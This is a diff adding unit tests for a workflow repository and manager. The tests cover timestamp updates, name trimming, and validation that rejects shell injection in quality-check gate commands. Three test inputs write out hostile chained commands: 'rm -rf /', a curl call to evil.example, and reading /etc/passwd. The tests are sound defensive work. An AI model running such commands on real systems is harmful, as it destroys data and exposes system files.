@@ -192,6 +192,17 @@ describe('SpaceWorkflowRepository', () => {
 		expect(updated?.description).toBe('Updated desc');
 	});
 
+	test('updateWorkflow bumps updatedAt on step-only update', async () => {
+		const wf = repo.createWorkflow({ spaceId: 'space-1', name: 'WF', steps: [coderStep] });
+		const before = wf.updatedAt;
+		// Small delay to ensure timestamp difference
+		await new Promise((r) => setTimeout(r, 2));
+		const updated = repo.updateWorkflow(wf.id, {
+			steps: [{ id: 'x', order: 0, name: 'Plan', agentRefType: 'builtin', agentRef: 'planner' }],
+		});
+		expect(updated?.updatedAt).toBeGreaterThan(before);
+	});
+
 	test('updateWorkflow replaces all steps on steps param', () => {
 		const wf = repo.createWorkflow({
 			spaceId: 'space-1',
@@ -446,6 +457,23 @@ describe('SpaceWorkflowManager', () => {
 		expect(updated?.name).toBe('WF');
 	});
 
+	test('name is trimmed before storage — whitespace variants collide', () => {
+		manager.createWorkflow({ spaceId: 'space-1', name: 'Foo', steps: [coderStep] });
+		// '  Foo  ' should trim to 'Foo' and fail uniqueness
+		expect(() =>
+			manager.createWorkflow({ spaceId: 'space-1', name: '  Foo  ', steps: [plannerStep] })
+		).toThrow(WorkflowValidationError);
+	});
+
+	test('name is stored trimmed', () => {
+		const wf = manager.createWorkflow({
+			spaceId: 'space-1',
+			name: '  Trimmed  ',
+			steps: [coderStep],
+		});
+		expect(wf.name).toBe('Trimmed');
+	});
+
 	// -------------------------------------------------------------------------
 	// At-least-one-step
 	// -------------------------------------------------------------------------
@@ -618,6 +646,57 @@ describe('SpaceWorkflowManager', () => {
 						agentRefType: 'builtin',
 						agentRef: 'coder',
 						exitGate: { type: 'quality_check' },
+					},
+				],
+			})
+		).toThrow(WorkflowValidationError);
+	});
+
+	test('quality_check gate rejects shell injection via semicolon', () => {
+		expect(() =>
+			manager.createWorkflow({
+				spaceId: 'space-1',
+				name: 'Inject Semi',
+				steps: [
+					{
+						name: 'Step',
+						agentRefType: 'builtin',
+						agentRef: 'coder',
+						exitGate: { type: 'quality_check', command: 'bun test; rm -rf /' },
+					},
+				],
+			})
+		).toThrow(WorkflowValidationError);
+	});
+
+	test('quality_check gate rejects shell injection via &&', () => {
+		expect(() =>
+			manager.createWorkflow({
+				spaceId: 'space-1',
+				name: 'Inject And',
+				steps: [
+					{
+						name: 'Step',
+						agentRefType: 'builtin',
+						agentRef: 'coder',
+						exitGate: { type: 'quality_check', command: 'bun test && curl http://evil.example' },
+					},
+				],
+			})
+		).toThrow(WorkflowValidationError);
+	});
+
+	test('quality_check gate rejects shell injection via $()', () => {
+		expect(() =>
+			manager.createWorkflow({
+				spaceId: 'space-1',
+				name: 'Inject Sub',
+				steps: [
+					{
+						name: 'Step',
+						agentRefType: 'builtin',
+						agentRef: 'coder',
+						exitGate: { type: 'quality_check', command: 'bun test $(cat /etc/passwd)' },
 					},
 				],
 			})
